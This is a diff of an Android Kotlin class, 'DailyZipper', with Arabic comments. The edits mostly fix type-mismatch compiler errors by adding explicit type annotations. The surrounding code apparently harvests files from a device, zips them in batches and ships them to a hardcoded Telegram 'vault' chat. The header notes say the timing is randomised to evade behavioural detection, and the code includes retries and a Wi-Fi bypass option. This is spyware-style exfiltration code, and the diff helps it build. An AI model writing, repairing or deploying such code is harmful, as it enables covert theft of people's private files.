@@ -34,7 +34,7 @@ import kotlin.random.Random
  * ✅ تم إصلاح تسجيل الهاش بحيث يتم فقط بعد نجاح الإرسال.
  * ✅ تم إضافة إعادة محاولة تلقائية للملفات الفاشلة.
  * ✅ تم إضافة عشوائية في فترات الحصاد لتجنب الكشف السلوكي.
- * ✅ تم إصلاح جميع أخطاء Type mismatch بتحديد الأنواع العامة صراحةً.
+ * ✅ تم إصلاح جميع أخطاء Type mismatch باستخدام متغيرات مؤقتة محددة النوع صراحةً.
  */
 class DailyZipper(
     context: Context,
@@ -50,7 +50,7 @@ class DailyZipper(
     private val activeMutex = Mutex()
 
     private val zipperActive = AtomicBoolean(false)
-    // ✅ التصحيح: تحديد النوع العام <String> لمنع خطأ Type mismatch
+    // ✅ تحديد النوع العام <String> لمنع خطأ Type mismatch
     private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())
     private val failedHashes = Collections.synchronizedSet(mutableSetOf<String>())
 
@@ -95,7 +95,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  دوال مساعدة (مع تحديد الأنواع صراحةً)
+    //  دوال مساعدة
     // ============================================================
 
     @Suppress("UNCHECKED_CAST")
@@ -103,15 +103,15 @@ class DailyZipper(
         return (config[key] as? T) ?: default
     }
 
-    // ✅ التصحيح: تحديد جميع الأنواع صراحةً في extractConfigValues
+    // ✅ تحديد جميع الأنواع صراحةً في extractConfigValues
     private fun extractConfigValues(): ConfigValues {
         return ConfigValues(
-            maxBatchSize = getConfigValue<Long>("max_batch_size", 48L * 1024L * 1024L),
-            storageExtra = getConfigValue<Long>("storage_extra", 100L * 1024L * 1024L),
-            sendRetryDelays = getConfigValue<List<Long>>("send_retry_delays", listOf(2000L, 4000L, 8000L)),
-            maxProcessedHashes = getConfigValue<Int>("max_processed_hashes", 10000),
-            defaultVaultId = getConfigValue<Long>("default_vault_id", -1003577715762L),
-            maxBatches = getConfigValue<Int>("max_batches", 10)
+            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L),
+            storageExtra = getConfigValue("storage_extra", 100L * 1024L * 1024L),
+            sendRetryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L)),
+            maxProcessedHashes = getConfigValue("max_processed_hashes", 10000),
+            defaultVaultId = getConfigValue("default_vault_id", -1003577715762L),
+            maxBatches = getConfigValue("max_batches", 10)
         )
     }
 
@@ -175,7 +175,7 @@ class DailyZipper(
         }
     }
 
-    // ✅ التصحيح الجذري للسطر 192: تحديد النوع <Long> صراحةً
+    // ✅ التصحيح الجذري للسطر 191: استخراج القيمة في متغير محدد النوع
     private fun checkStorage(requiredBytes: Long): Boolean {
         val ctx = appContext ?: return false
         return try {
@@ -186,8 +186,8 @@ class DailyZipper(
                 @Suppress("DEPRECATION")
                 stat.availableBlocks * stat.blockSize
             }
-            // ✅ التصحيح: تحديد النوع <Long> صراحةً لمنع المترجم من استنتاج Nothing
-            val storageExtra = getConfigValue<Long>("storage_extra", 100L * 1024L * 1024L)
+            // ✅ التصحيح: استخراج القيمة في متغير Long صريح لمنع المترجم من استنتاج Nothing
+            val storageExtra: Long = getConfigValue("storage_extra", 100L * 1024L * 1024L)
             availableBytes >= requiredBytes + storageExtra
         } catch (e: Exception) {
             writeLog("Storage check error: ${e.message}")
@@ -230,12 +230,12 @@ class DailyZipper(
         }
     }
 
-    // ✅ التصحيح: تحديد النوع <Int> صراحةً
+    // ✅ التصحيح: استخراج القيمة في متغير Int صريح
     private fun trackHash(hash: String) {
         if (hash.isBlank()) return
         synchronized(processedHashes) {
-            val maxSize = getConfigValue<Int>("max_processed_hashes", 10000)
-            if (processedHashes.size >= maxSize) {
+            val maxProcessed: Int = getConfigValue("max_processed_hashes", 10000)
+            if (processedHashes.size >= maxProcessed) {
                 processedHashes.clear()
             }
             processedHashes.add(hash)
@@ -268,11 +268,12 @@ class DailyZipper(
         }
     }
 
-    // ✅ التصحيح: تحديد النوع <Long> صراحةً
+    // ✅ التصحيح: استخراج القيمة في متغير Long صريح
     private fun cleanupOldFiles() {
         try {
             val now = System.currentTimeMillis()
-            val maxAge = getConfigValue<Long>("temp_file_age", 3600L) * 1000L
+            val tempFileAge: Long = getConfigValue("temp_file_age", 3600L)
+            val maxAge = tempFileAge * 1000L
             val dirs = listOf(pendingDir, queueDir)
             dirs.forEach { dir ->
                 if (dir.exists()) {
@@ -292,7 +293,7 @@ class DailyZipper(
     //  إرسال الملفات إلى Telegram (مع إعادة محاولة)
     // ============================================================
 
-    // ✅ التصحيح: تحديد الأنواع صراحةً
+    // ✅ التصحيح: استخراج القيم في متغيرات محددة النوع
     private suspend fun safeSend(zipPath: String, caption: String, targetChat: Long? = null): Boolean {
         val zipFile = File(zipPath)
         if (!zipFile.exists() || zipFile.length() == 0L) {
@@ -300,8 +301,8 @@ class DailyZipper(
             return false
         }
 
-        val chatId = targetChat ?: getConfigValue<Long>("default_vault_id", -1003577715762L)
-        val retryDelays = getConfigValue<List<Long>>("send_retry_delays", listOf(2000L, 4000L, 8000L))
+        val chatId: Long = targetChat ?: getConfigValue("default_vault_id", -1003577715762L)
+        val retryDelays: List<Long> = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L))
 
         for ((attempt, delayMs) in retryDelays.withIndex()) {
             try {
@@ -366,7 +367,7 @@ class DailyZipper(
             try {
                 val files = collectPendingFiles()
                 if (files.isEmpty()) {
-                    val defaultChatId = getConfigValue<Long>("default_vault_id", -1003577715762L)
+                    val defaultChatId: Long = getConfigValue("default_vault_id", -1003577715762L)
                     sendMessage(chatId ?: defaultChatId, "📭 لا توجد ملفات للحصاد")
                     return@launch
                 }
@@ -408,7 +409,7 @@ class DailyZipper(
         return filtered
     }
 
-    // ✅ التصحيح: استخدام extractConfigValues.maxBatches بدلاً من getConfigValue
+    // ✅ التصحيح: استخدام configValues.maxBatches بدلاً من getConfigValue مباشرة
     private suspend fun packAndShip(files: List<File>, bypassWifi: Boolean = false, reportId: Long? = null): Boolean {
         if (files.isEmpty()) {
             writeLog("No files to pack")
@@ -449,7 +450,7 @@ class DailyZipper(
         writeLog("📦 Split into ${batches.size} batches (max ${batches.maxOfOrNull { it.size } ?: 0} files)")
 
         var successCount = 0
-        // ✅ التصحيح الجذري: استخدام configValues.maxBatches بدلاً من getConfigValue
+        // ✅ التصحيح: استخدام configValues.maxBatches بدلاً من getConfigValue
         val totalBatches = batches.size.coerceAtMost(configValues.maxBatches)
 
         for (i in 0 until totalBatches) {
@@ -516,9 +517,9 @@ class DailyZipper(
                     writeLog("⚠️ Batch ${i + 1}/$totalBatches failed, files kept for retry")
                 }
 
+                // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay
                 if (i < totalBatches - 1) {
-                    // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay
-                    val delayTime = (2000L..8000L).random()
+                    val delayTime: Long = (2000L..8000L).random()
                     delay(delayTime)
                 }
 
@@ -624,7 +625,7 @@ class DailyZipper(
                 writeLog("📂 Found ${files.size} pending files")
 
                 // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay
-                val startDelay = (5000L..15000L).random()
+                val startDelay: Long = (5000L..15000L).random()
                 delay(startDelay)
 
                 val success = packAndShip(files, bypassWifi = false)
